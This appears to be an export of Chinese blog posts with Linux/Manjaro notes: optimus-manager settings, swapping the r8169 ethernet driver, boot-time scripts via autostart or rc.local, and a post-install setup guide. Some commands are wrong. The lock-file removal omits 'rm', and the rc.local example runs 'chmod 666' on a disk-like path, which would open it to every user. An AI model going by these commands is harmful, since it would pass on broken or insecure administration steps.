<h1 id="配置文件详解"><a href="#配置文件详解" class="headerlink" title="配置文件详解"></a>配置文件详解</h1><p>optimus-manager的配置文件：<code>/usr/share/optimus-manager.conf</code></p>
<p><strong>如需自定义配置，将该文件复制一份到<code>/etc/optimus-manager/</code>目录下进行修改即可</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[optimus]</span><br><span class="line"></span><br><span class="line"># 此参数定义接通Nvidia卡电源的方法</span><br><span class="line"># 可能的值：</span><br><span class="line"># -nouveau：将nouveau模块加载到Nvidia卡上</span><br><span class="line"># -bbswitch：使用bbswitch模块关闭卡的电源（需要bbswitch依赖项）</span><br><span class="line"># -acpi_call：尝试各种ACPI方法调用来打开和关闭卡的电源（需要acpi_call依赖项）</span><br><span class="line"># -none：请勿将外部模块用于电源管理。对于某些笔记本电脑型号，最好将此选项与pci_power_control结合使用（请参见下文）。设置该选项后，您还可以使用脚本nvidia-enable.sh和nvidia-disable.sh执行自定义命令以进行电源管理</span><br><span class="line"></span><br><span class="line">switching&#x3D;bbswitch</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 在Intel模式下启用PCI电源管理。此选项与acpi_call和bbswitch不兼容，因此在这些情况下将被忽略</span><br><span class="line"></span><br><span class="line">pci_power_control&#x3D;yes</span><br><span class="line"></span><br><span class="line"># 从PCI总线上卸下Nvidia卡。可以防止电源开关引起的死机。如果switching &#x3D; nouveau或switching &#x3D; bbswitch则被忽略</span><br><span class="line"></span><br><span class="line">pci_remove&#x3D;no</span><br><span class="line"></span><br><span class="line"># 在重新加载nvidia模块之前，请在PCI级别上重置Nvidia卡。在重新加载nvidia模块之前，请确保卡处于新状态。可能会解决一些切换问题</span><br><span class="line"># 可能的值:</span><br><span class="line"># -no:不执行任何重置</span><br><span class="line"># -function_level:执行轻度的“功能级别”重置</span><br><span class="line"># -hot_reset:对PCI桥接器执行“热重置”。注意：此方法直接与硬件混淆，使用前请阅读optimus-manager的在线文档。另外，即使pci_remove&#x3D;no，也会执行PCI移除操作</span><br><span class="line"></span><br><span class="line">pci_reset&#x3D;no</span><br><span class="line"></span><br><span class="line"># 切换GPU时自动注销当前的桌面会话。当前，以下DE &#x2F; WM支持此功能：KDE Plasma，GNOME，XFCE，Deepin，i3，Openbox，AwesomeWM，bspwm如果禁用此选项或使用其他桌面环境，则GPU切换仅在下一个图形显示时有效会话登录</span><br><span class="line"></span><br><span class="line">auto_logout &#x3D;yes</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[intel]</span><br><span class="line"></span><br><span class="line"># 用于Intel GPU的驱动程序。</span><br><span class="line"># 可能的值:modesetting，intel</span><br><span class="line"># 要使用intel驱动程序，需要安装软件包“ xf86-video-intel”</span><br><span class="line"></span><br><span class="line">driver&#x3D;modesetting</span><br><span class="line"></span><br><span class="line"># 加速方法（对应于Xorg配置中的AccelMethod）。仅适用于intel驱动程序</span><br><span class="line"># 可能的值:sna,xna</span><br><span class="line"># 默认值（未指定任何选项）</span><br><span class="line">accel&#x3D;</span><br><span class="line"></span><br><span class="line"># 在Xorg配置中启用TearFree选项，仅适用于intel驱动程序</span><br><span class="line"># 可能的值:yes,no</span><br><span class="line"># 保留默认值（未指定任何选项）</span><br><span class="line">tearfree&#x3D;</span><br></pre></td></tr></table></figure>
<p>参考:<br><a href="https://blog.edward-p.xyz/2019/04/optimus-manager/">使用 optimus-manager 来管理显卡切换</a></p>
<p>Optimus-Manager的<br><a href="https://github.com/Askannz/optimus-manager/blob/master/README.md">README</a><br><a href="https://github.com/Askannz/optimus-manager/wiki">Wiki</a><br><a href="https://github.com/Askannz/optimus-manager/wiki/A-guide--to-power-management-options">电源管理选项指南</a><br><a href="https://github.com/Askannz/optimus-manager/wiki/FAQ,-common-issues,-troubleshooting">常见问题，常见问题，故障排除</a></p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Manjaro有线网卡驱动</title>
    <url>/posts/496f126/</url>
    <content><![CDATA[<p>Manjaro有线网卡驱动可能会装成非对应的版本，造成无法使用以太网，需要卸载原有驱动安装对应的匹配驱动</p>
<h1 id="查看并卸载原驱动"><a href="#查看并卸载原驱动" class="headerlink" title="查看并卸载原驱动"></a>查看并卸载原驱动</h1><p>使用 <code>lspci | grep net</code> 查询网卡设备信息</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">➤ lspci | grep net</span><br><span class="line">04:00.0 Ethernet controller: Realtek Semiconductor Co., Ltd. RTL8111&#x2F;8168&#x2F;8411 PCI Express Gigabit Ethernet Controller (rev 15)</span><br></pre></td></tr></table></figure>
<p>使用 <code>lspci -k | grep -A 4 net</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">➤ lspci -k | grep -A 4 net</span><br><span class="line">04:00.0 Ethernet controller: Realtek Semiconductor Co., Ltd. RTL8111&#x2F;8168&#x2F;8411 PCI Express Gigabit Ethernet Controller (rev 15)</span><br><span class="line">	Subsystem: Acer Incorporated [ALI] Device 1133</span><br><span class="line">	Kernel driver in use: r8169</span><br><span class="line">	Kernel modules: r8169</span><br></pre></td></tr></table></figure>
<a id="more"></a>
<p>查询原驱动文件的位置，删除或备份</p>
<p>以 <code>r8169</code> 驱动为例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">modinfo r8169 |grep filename</span><br><span class="line"></span><br><span class="line"># 备份</span><br><span class="line">mv &#x2F;lib&#x2F;modules&#x2F;5.10.7-3-MANJARO&#x2F;kernel&#x2F;drivers&#x2F;net&#x2F;ethernet&#x2F;realtek&#x2F;r8169.ko.xz ~&#x2F;r8169.ko.xz.backup</span><br><span class="line"></span><br><span class="line"># 卸载</span><br><span class="line">rmmod r8169</span><br><span class="line"></span><br><span class="line"># 查询是否成功，若无结果则成功</span><br><span class="line">lsmod | grep r8169</span><br></pre></td></tr></table></figure>
<h1 id="安装正确的驱动"><a href="#安装正确的驱动" class="headerlink" title="安装正确的驱动"></a>安装正确的驱动</h1><p>通过查询我的网卡是 <code>RTL8111/8168/8411</code> ，使用命令 <code>sudo pacman -Ss rxxxx</code> 搜索存在驱动 <code>r8168</code> ，选择相应内核版本的进行安装即可 (<code>sudo pacman -S linux510-r8168</code>)。</p>
<p>尝试挂载 (<code>sudo modprobe r8168</code>) 或重启系统，重启后就能使用了。</p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://segmentfault.com/a/1190000037617931">Manjaro安装有线网卡驱动</a></p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Manjaro</tag>
      </tags>
  </entry>
  <entry>
    <title>Manjaro自定义脚本开机运行</title>
    <url>/posts/48f576ac/</url>
    <content><![CDATA[<h1 id="通过启动器"><a href="#通过启动器" class="headerlink" title="通过启动器"></a>通过启动器</h1><p><strong>现在需要开机运行自定义脚本<code>~/my_shell.sh</code></strong></p>
<h3 id="创建启动器文件"><a href="#创建启动器文件" class="headerlink" title="创建启动器文件"></a>创建启动器文件</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim ~/.config/autostart/my_shell.desktop</span><br></pre></td></tr></table></figure>
<p><strong>内容</strong>：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[Desktop Entry]</span><br><span class="line">Encoding=UTF-8</span><br><span class="line">Name=my shell script</span><br><span class="line">GenericName=my shell script</span><br><span class="line">Comment=The is my shell script</span><br><span class="line">Exec=~/my_shell.sh %f</span><br><span class="line">Icon=~/my_shell.png</span><br><span class="line">Terminal=<span class="literal">false</span></span><br><span class="line">Type=Application</span><br><span class="line">Categories=Application;Programme;</span><br></pre></td></tr></table></figure><br><a id="more"></a></p>
<h3 id="启动器文件语法"><a href="#启动器文件语法" class="headerlink" title="启动器文件语法"></a>启动器文件语法</h3><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">关键词</th>
<th style="text-align:center">意义</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><code>[Desktop Entry]</code></td>
<td style="text-align:center">文件头</td>
</tr>
<tr>
<td style="text-align:left"><code>Encoding</code></td>
<td style="text-align:center">编码</td>
</tr>
<tr>
<td style="text-align:left"><code>Name</code></td>
<td style="text-align:center">应用名称</td>
</tr>
<tr>
<td style="text-align:left"><code>Name[xx]</code></td>
<td style="text-align:center">不同语言的应用名称</td>
</tr>
<tr>
<td style="text-align:left"><code>GenericName</code></td>
<td style="text-align:center">描述</td>
</tr>
<tr>
<td style="text-align:left"><code>Comment</code></td>
<td style="text-align:center">注释</td>
</tr>
<tr>
<td style="text-align:left"><code>Exec</code></td>
<td style="text-align:center">执行的命令</td>
</tr>
<tr>
<td style="text-align:left"><code>Icon</code></td>
<td style="text-align:center">图标路径</td>
</tr>
<tr>
<td style="text-align:left"><code>Terminal</code></td>
<td style="text-align:center">是否使用终端</td>
</tr>
<tr>
<td style="text-align:left"><code>Type</code></td>
<td style="text-align:center">启动器类型</td>
</tr>
<tr>
<td style="text-align:left"><code>Categories</code></td>
<td style="text-align:center">应用的类型（内容相关）</td>
</tr>
</tbody>
</table>
</div>
<p><strong>Exec</strong>常用的参数有：<code>%f</code> <code>%F</code> <code>%u</code> <code>%U</code><br><code>%f</code>：单个文件名，即使选择了多个文件。如果已选择的文件不在本地文件系统中（比如说在HTTP或者FTP上），这个文件将被作为一个临时文件复制到本地，％f将指向本地临时文件；<br><code>%F</code>：文件列表。用于程序可以同时打开多个本地文件。每个文件以分割段的方式传递给执行程序。<br><code>%u</code>：单个URL。本地文件以文件URL或文件路径的方式传递。<br><code>%U</code>：URL列表。每个URL以分割段的方式传递给执行程序。本地文件以文件URL或文件路径的方式传递</p>
<h3 id="赋予执行权限"><a href="#赋予执行权限" class="headerlink" title="赋予执行权限"></a>赋予执行权限</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">chmod +x ~/.config/autostart/my_shell.desktop</span><br></pre></td></tr></table></figure>
<h1 id="通过rc-local方式"><a href="#通过rc-local方式" class="headerlink" title="通过rc.local方式"></a>通过rc.local方式</h1><p><strong>arch系是不支持<code>rc.local</code>的，若需要开机以管理员执行就需要用到<code>rc.local</code></strong></p>
<h3 id="安装启用rc-local"><a href="#安装启用rc-local" class="headerlink" title="安装启用rc.local"></a>安装启用<code>rc.local</code></h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S systemd-rc-local</span><br><span class="line">systemctl <span class="built_in">enable</span> rc-local</span><br></pre></td></tr></table></figure>
<h3 id="创建rc-local文件"><a href="#创建rc-local文件" class="headerlink" title="创建rc.local文件"></a>创建<code>rc.local</code>文件</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo touch /etc/rc.local</span><br><span class="line">sudo chmod 755 /etc/rc.local</span><br></pre></td></tr></table></figure>
<h3 id="编辑运行脚本"><a href="#编辑运行脚本" class="headerlink" title="编辑运行脚本"></a>编辑运行脚本</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim /etc/rc.local</span><br><span class="line"><span class="comment">#加入内容</span></span><br><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">chmod 666 /etc/sda</span><br><span class="line"></span><br><span class="line"><span class="comment">#也可另外创建一个脚本文件，添加执行该脚本的执行语句</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Manjaro</tag>
      </tags>
  </entry>
  <entry>
    <title>Manjaro转移笔记</title>
    <url>/posts/eb298cff/</url>
    <content><![CDATA[<h1 id="manjaro转移笔记"><a href="#manjaro转移笔记" class="headerlink" title="manjaro转移笔记"></a>manjaro转移笔记</h1><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><h3 id="进入live模式"><a href="#进入live模式" class="headerlink" title="进入live模式"></a>进入live模式</h3><p>对时区，语言进行设置后进入live模式</p>
<p><img data-src="manjaro0.png" alt="manjaro0"></p>
<h3 id="配置安装"><a href="#配置安装" class="headerlink" title="配置安装"></a>配置安装</h3><a id="more"></a>
<p><img data-src="manjaro1.png" alt="manjaro1"></p>
<p>设置语言</p>
<p><img data-src="manjaro2.png" alt="manjaro2"></p>
<p>设置时区</p>
<p><img data-src="manjaro3.png" alt="manjaro3"></p>
<p>设置键盘（默认即可）</p>
<p><img data-src="manjaro4.png" alt="manjaro4"></p>
<p>根据情况选择存储器，然后选择分区方式（一整块磁盘，使用某个分区，手动去分区&lt;<code>/boot</code>或<code>/boot/efi</code>，<code>/</code>，<code>swap</code>，<code>/home</code>等&gt;），选择引导程序位置（<code>/boot</code>或<code>/boot/efi</code>）</p>
<p><img data-src="manjaro5.png" alt="manjaro5"></p>
<p>设置用户</p>
<p><img data-src="manjaro6.png" alt="manjaro6"></p>
<p>开始安装</p>
<p><img data-src="manjaro7.png" alt="manjaro7"></p>
<p>安装完成重启</p>
<h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><h3 id="换源"><a href="#换源" class="headerlink" title="换源"></a>换源</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman-mirrors -i -c China -m rank</span><br><span class="line"><span class="comment">#选择https://mirrors.tuna.tsinghua.edu.cn/manjaro源</span></span><br><span class="line"></span><br><span class="line">sudo gedit /etc/pacman.conf</span><br><span class="line"><span class="comment"># https://github.com/archlinuxcn/mirrorlist-repo</span></span><br><span class="line"><span class="comment">#在末尾加入：</span></span><br><span class="line"><span class="comment">## 中国科学技术大学 (安徽合肥) (ipv4, ipv6, http, https)</span></span><br><span class="line">[archlinuxcn]</span><br><span class="line">Server = https://mirrors.ustc.edu.cn/archlinuxcn/<span class="variable">$arch</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 也可选择使用 Manjarocn 用于解决一些软件由于 Manjaro 慢版拍导致找不到一些新版本的依赖</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装archlinuxcn秘钥</span></span><br><span class="line">sudo pacman -S archlinuxcn-keyring</span><br><span class="line"></span><br><span class="line">[manjarocn]</span><br><span class="line">Server = https://repo.manjarocn.org/stable/x86_64</span><br><span class="line"><span class="comment"># 安装密钥</span></span><br><span class="line">sudo pacman-key --recv-keys 974B3711CFB9BF2D &amp;&amp; sudo pacman-key --lsign-key 974B3711CFB9BF2D</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 同步软件包数据库</span></span><br><span class="line">sudo pacman -Syy</span><br><span class="line"><span class="comment"># 更新</span></span><br><span class="line">sudo pacman -Su</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#无法锁定数据库,删除/var/lib/pacman/db.lck</span></span><br><span class="line">sudo /var/lib/pacman/db.lck</span><br></pre></td></tr></table></figure>
<h3 id="安装头文件"><a href="#安装头文件" class="headerlink" title="安装头文件"></a>安装头文件</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">uname -r</span><br><span class="line">sudo pacman -Ss linux-header<span class="comment">#根据内核选择版本安装</span></span><br><span class="line">sudo pacman -S linux419-headers</span><br></pre></td></tr></table></figure>
<h3 id="删除不再被依赖的软件"><a href="#删除不再被依赖的软件" class="headerlink" title="删除不再被依赖的软件"></a>删除不再被依赖的软件</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -R $(sudo pacman -Qdtq)</span><br><span class="line">sudo pacman -R (sudo pacman -Qdtq)	<span class="comment">#fish</span></span><br><span class="line"></span><br><span class="line">gamin-0.1.10-9  gnome-shell-extension-taskbar-57.0-2</span><br><span class="line">gtkmm-1:2.24.5-3  gtksourceview2-2.10.5-4  js52-52.9.0-3</span><br><span class="line">libnm-glib-1.18.2-1  libxdg-basedir-1.2.0-4</span><br></pre></td></tr></table></figure>
<h3 id="带颜色的pacman"><a href="#带颜色的pacman" class="headerlink" title="带颜色的pacman"></a>带颜色的pacman</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo vim /etc/pacman.conf</span><br><span class="line"><span class="comment">#修改36行，将#Color的注释去掉</span></span><br></pre></td></tr></table></figure>
<h3 id="gnome插件"><a href="#gnome插件" class="headerlink" title="gnome插件"></a>gnome插件</h3><blockquote>
<p>extensions.gnome.org</p>
</blockquote>
<p><strong>安装浏览器插件</strong></p>
<p><strong>安装控制器：</strong></p>
<p><strong>sudo pacman -S chrome-gnome-shell</strong></p>
<blockquote>
<p>arc menu 程序菜单，需要重启电脑<br>Arch Linux Updates Indicator archlinux软件更新检测插件,需要配合pacman-contrib使用<br>Caffeine 防止自动挂起<em><br>Clipboard Indicator 一个剪贴板</em><br>Coverflow Alt-Tab 更好的窗口切换<em><br>Dash to Dock 把dash栏变为一个dock</em><br>Dynamic Top Bar 顶栏透明化<br>Extension Update Notifier gnome插件更新提示<br>system-monitor 一个系统监视器<em><br>Night Light Slider 调节gnome夜间模式的亮度情况</em><br>OpenWeather 天气插件<br>Proxy Switcher 代理插件<em><br>Random Wallpaper 自动切换壁纸,<br>Simple net speed 网速监测</em><br>Sound Input &amp; Output Device Chooser 声音设备选择<br>Status Area Horizontal Spacing 让顶栏更紧凑<em><br>Hibernate Status Button 添加一个休眠按钮</em><br>TopIcons Plus 把托盘图标放到顶栏<em><br>Window Is Ready - Notification Remover 去除烦人的window is ready提醒<br>Lock Keys 大小写和数字键盘提示</em><br>Appfolders Management extension Appfolders管理扩展排列应用程序*<br>Screenshot Tool 截图工具</p>
</blockquote>
<h3 id="开启挂起-休眠模式"><a href="#开启挂起-休眠模式" class="headerlink" title="开启挂起/休眠模式"></a>开启挂起/休眠模式</h3><blockquote>
<p>suspend：挂起,待机,暂停 (str: suspend to RAM)保存到内存 通电 低功耗</p>
<p>hibernate：休眠,冬眠 (std: suspend to disk)保存至硬盘swap 断电 关机</p>
<p>HybridSleep：混合睡眠 (strd:suspend to both)保存到内存和硬盘 通电 低功耗</p>
</blockquote>
<p><strong>确保有SWAP分区</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">lsblk	<span class="comment">#查看是否有swap分区</span></span><br><span class="line">...</span><br><span class="line">├─sdb2   8:18   0     8G  0 part [SWAP]</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<blockquote>
<p><strong>若没有SWAP分区就新建一个</strong></p>
<p>使用<code>disks</code>分区工具划分一个大小合适的分区<code>sdxy</code></p>
<p>mkswap /dev/sdxy #格式化为交换分区</p>
<p>swapon /dev/sdxy #加载交换分区</p>
</blockquote>
<p><strong>开机挂载swap</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo vim /etc/fstab		<span class="comment">#添加</span></span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;dev&#x2F;swap	 swap	swap    defaults,noatime,discard 0 2</span><br></pre></td></tr></table></figure>
<p>添加内核配置**</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo vim /etc/default/grub	<span class="comment">#在 GRUB_CMDLINE_LINUX_DEFAULT 中添加 resume=/dev/sdxy</span></span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">GRUB_CMDLINE_LINUX_DEFAULT=<span class="string">&quot;quiet intel_pstate=enable resume=/dev/sdxy&quot;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo grub-mkconfig -o /boot/grub/grub.cfg	<span class="comment">#刷新grub</span></span><br></pre></td></tr></table></figure>
<p>配置initramfs的resume钩子**</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo vim /etc/mkinitcpio.conf	<span class="comment">#在 HOOKS 中添加resume</span></span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">HOOKS=<span class="string">&quot;base udev resume autodetect modconf block filesystems keyboard fsck&quot;</span></span><br></pre></td></tr></table></figure>
<p>如果使用lvm分区就需要将resume放在lvm后面 <code>HOOKS=&quot;base udev autodetect modconf block lvm2 resume filesystems keyboard fsck&quot;</code></p>
<p><strong>生成initramfs镜像</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo mkinitcpio -p linux419		<span class="comment">#linux419为/etc/mkinitcpio.d/下的一个系统使用的内核版本相应的一个preset文件名</span></span><br></pre></td></tr></table></figure>
<p><strong>设置低电量休眠</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo vim /etc/UPower/UPower.conf</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PercentageLow&#x3D;15  #&lt;&#x3D;15%低电量</span><br><span class="line">PercentageCritical&#x3D;10  #&lt;&#x3D;10%警告电量</span><br><span class="line">PercentageAction&#x3D;5  #&lt;&#x3D;5%执行动作（即CriticalPowerAction)的电量</span><br><span class="line"></span><br><span class="line">CriticalPowerAction&#x3D;Hibernate #(在本示例中是电量&lt;&#x3D;5%）执行关机</span><br><span class="line"></span><br><span class="line">#suspend：挂起,待机,暂停 (str: suspend to RAM)保存到内存 通电 低功耗</span><br><span class="line">#hibernate：休眠,冬眠 (std: suspend to disk)保存至硬盘swap 断电 关机</span><br><span class="line">#HybridSleep：混合睡眠 (strd:suspend to both)保存到内存和硬盘 通电 低功耗</span><br></pre></td></tr></table></figure>
<p>合上盖章休眠**</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo vim /etc/systemd/logind.conf	<span class="comment">#添加内容</span></span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HandleLidSwitch&#x3D;hibernate</span><br><span class="line">#盒盖综合睡眠眠：HandleLidSwitch&#x3D;HybridSleep</span><br><span class="line">#按下电源键休眠： HandlePowerKey&#x3D;hibernate</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl restart systemd-logind	<span class="comment">#使配置生效，注意保存数据，会注销登录</span></span><br></pre></td></tr></table></figure>
<h3 id="家目录下的中文目录修改成英文"><a href="#家目录下的中文目录修改成英文" class="headerlink" title="家目录下的中文目录修改成英文"></a>家目录下的中文目录修改成英文</h3><p><strong>修改成英文后方便命令行操作</strong></p>
<h4 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h4><ol>
<li><p>修改系统当前语言环境为英文</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> LANG=en_US</span><br></pre></td></tr></table></figure>
</li>
<li><p>更新家目录的文件命名</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">xdg-user-dirs-gtk-update</span><br></pre></td></tr></table></figure>
<p>跳出对话框，提示是否更新成英文，同意即可</p>
</li>
<li><p>改回系统语言环境为中文</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> LANG=zh_CN.UTF-8</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h4 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mv ~/桌面 ~/Desktop</span><br><span class="line">mv ~/图片 ~/Pictures</span><br><span class="line">mv ~/文档 ~/Documets</span><br><span class="line">mv ~/音乐 ~/Music</span><br><span class="line">mv ~/视频 ~/Videos</span><br><span class="line">mv ~/下载 ~/Download</span><br><span class="line">mv ~/模板 ~/Templates</span><br><span class="line">mv ~/公共 ~/Publicshare</span><br><span class="line"></span><br><span class="line">vim ~/.config/user-dirs.dirs</span><br><span class="line"><span class="comment"># 修改内容</span></span><br><span class="line">XDG_DESKTOP_DIR=<span class="string">&quot;<span class="variable">$HOME</span>/Desktop&quot;</span></span><br><span class="line">XDG_DOWNLOAD_DIR=<span class="string">&quot;<span class="variable">$HOME</span>/Download&quot;</span></span><br><span class="line">XDG_TEMPLATES_DIR=<span class="string">&quot;<span class="variable">$HOME</span>/Templates&quot;</span></span><br><span class="line">XDG_PUBLICSHARE_DIR=<span class="string">&quot;<span class="variable">$HOME</span>/Publicshare&quot;</span></span><br><span class="line">XDG_DOCUMENTS_DIR=<span class="string">&quot;<span class="variable">$HOME</span>/Documents&quot;</span></span><br><span class="line">XDG_MUSIC_DIR=<span class="string">&quot;<span class="variable">$HOME</span>/Music&quot;</span></span><br><span class="line">XDG_PICTURES_DIR=<span class="string">&quot;<span class="variable">$HOME</span>/Pictures&quot;</span></span><br><span class="line">XDG_VIDEOS_DIR=<span class="string">&quot;<span class="variable">$HOME</span>/Videos&quot;</span></span><br></pre></td></tr></table></figure>
<h3 id="修改锁屏壁纸"><a href="#修改锁屏壁纸" class="headerlink" title="修改锁屏壁纸"></a>修改锁屏壁纸</h3><p>创建修改脚本（login-backgroun.sh）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">WORKDIR=~/tmp/gdm-login-background</span><br><span class="line">GST=/usr/share/gnome-shell/gnome-shell-theme.gresource</span><br><span class="line">GSTRES=$(basename <span class="variable">$GST</span>)</span><br><span class="line"></span><br><span class="line">mkdir -p <span class="variable">$WORKDIR</span></span><br><span class="line"><span class="built_in">cd</span> <span class="variable">$WORKDIR</span></span><br><span class="line">mkdir theme</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> r <span class="keyword">in</span> `gresource list <span class="variable">$GST</span>`; <span class="keyword">do</span></span><br><span class="line">  gresource extract <span class="variable">$GST</span> <span class="variable">$r</span> &gt;$WORKDIR$(<span class="built_in">echo</span> <span class="variable">$r</span> | sed -e <span class="string">&#x27;s/^\/org\/gnome\/shell\//\//g&#x27;</span>)</span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> theme</span><br><span class="line">cp <span class="string">&quot;<span class="variable">$IMAGE</span>&quot;</span> ./</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;</span></span><br><span class="line"><span class="string">#lockDialogGroup &#123;</span></span><br><span class="line"><span class="string">  background: #2e3436 url(resource:///org/gnome/shell/theme/<span class="subst">$(basename $IMAGE)</span>);</span></span><br><span class="line"><span class="string">  background-size: cover;</span></span><br><span class="line"><span class="string">  background-repeat: no-repeat;</span></span><br><span class="line"><span class="string">&#125;&quot;</span> &gt;&gt;gnome-shell.css</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="string">&lt;gresources&gt;</span></span><br><span class="line"><span class="string">  &lt;gresource prefix=&quot;/org/gnome/shell/theme&quot;&gt;&#x27;</span> &gt;<span class="string">&quot;<span class="variable">$&#123;GSTRES&#125;</span>.xml&quot;</span></span><br><span class="line"><span class="keyword">for</span> r <span class="keyword">in</span> `ls *.*`; <span class="keyword">do</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;    &lt;file&gt;<span class="variable">$r</span>&lt;/file&gt;&quot;</span> &gt;&gt;<span class="string">&quot;<span class="variable">$&#123;GSTRES&#125;</span>.xml&quot;</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;  &lt;/gresource&gt;</span></span><br><span class="line"><span class="string">&lt;/gresources&gt;&#x27;</span> &gt;&gt;<span class="string">&quot;<span class="variable">$&#123;GSTRES&#125;</span>.xml&quot;</span></span><br><span class="line"></span><br><span class="line">glib-compile-resources <span class="string">&quot;<span class="variable">$&#123;GSTRES&#125;</span>.xml&quot;</span></span><br><span class="line"></span><br><span class="line">sudo mv <span class="string">&quot;/usr/share/gnome-shell/<span class="variable">$GSTRES</span>&quot;</span> <span class="string">&quot;/usr/share/gnome-shell/<span class="variable">$&#123;GSTRES&#125;</span>.backup&quot;</span></span><br><span class="line">sudo mv <span class="string">&quot;<span class="variable">$GSTRES</span>&quot;</span> /usr/share/gnome-shell/</span><br><span class="line"></span><br><span class="line">rm -r <span class="variable">$WORKDIR</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$CREATED_TMP</span>&quot;</span> = <span class="string">&quot;1&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">  rm -r ~/tmp</span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#使用bash运行脚本</span></span><br><span class="line">IMAGE=~/图片/00.jpeg sh ./login-backgroun.sh</span><br><span class="line"><span class="comment">#重启</span></span><br><span class="line">reboot</span><br></pre></td></tr></table></figure>
<h2 id="安装常用软件"><a href="#安装常用软件" class="headerlink" title="安装常用软件"></a>安装常用软件</h2><h3 id="安装包管理工具"><a href="#安装包管理工具" class="headerlink" title="安装包管理工具"></a>安装包管理工具</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S yay yaourt base-devel</span><br></pre></td></tr></table></figure>
<p>使用AUR镜像</p>
<p>yaourt 用户<br>修改 <code>/etc/yaourtrc</code>，去掉 # AURURL 的注释，修改为<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">AURURL&#x3D;&quot;https:&#x2F;&#x2F;aur.tuna.tsinghua.edu.cn&quot;</span><br></pre></td></tr></table></figure></p>
<p>yay 用户<br>执行以下命令修改 aururl :<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">yay --aururl &quot;https:&#x2F;&#x2F;aur.tuna.tsinghua.edu.cn&quot; --save</span><br></pre></td></tr></table></figure></p>
